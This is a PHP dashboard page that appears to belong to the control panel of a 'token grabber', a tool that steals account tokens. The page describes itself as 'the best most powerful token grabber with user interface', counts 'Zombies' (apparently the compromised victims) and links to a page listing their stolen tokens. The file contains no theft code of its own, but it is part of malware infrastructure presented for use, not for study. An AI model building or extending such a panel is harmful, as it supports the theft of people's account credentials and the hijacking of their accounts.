<?php

    require_once('Inc/fonctions.php');

    if(!CheckLogin()){
        header('Location: login');
    }

    $title = "Project";
    require('Inc/Dash.php');

?>

    <!-- Main -->
    <section class="section_main">
        <div class="main">
            <img src="https://i.imgur.com/l9hMrQO.gif" alt="">
            <h1>Marshal's Project</h1>
            <p>The Best Most powerfull token grabber with user interface.</p>
            <a href="tokens">View Zombies</a>
        </div>
    </section>

    <!-- Statistiques -->
    <section class="section_stats">
        <!-- <div class="section_title">
            <p>Statistiques</p>
        </div> -->
        <div class="stats">
            <div class="stat">
                <span><?=ZombiesCount();?></span>
                <p>Zombies</p>
            </div>

            <div class="stat">
                <span>0</span>
                <p>Devices</p>
            </div>

            <div class="stat">
                <span>0</span>
                <p>Users</p>
            </div>
        </div>
    </section>


    <!-- Owner(s) -->
    <section class="section_owners">
        <div class="owners">
            <div class="owner">
                <img src="https://i.imgur.com/j79yzMM.gif" alt="" srcset="">
                <span>Cepheid</span>
                <p>Indonesia Developer, frontend, backend, <br>python, node, Csharp...</p>
                <a target="_blank" href="https://github.com/cepheidev">Follow</a>
            </div>
        </div>
    </section>

    <footer>
        Copyright ©️ Made By <a target="_blank" href="https://github.com/cepheidev">Marshal`s Lab</a>
    </footer>
    
    <!-- Javascript -->
    <script src="assets/js/index.js"></script>
</body>
</html>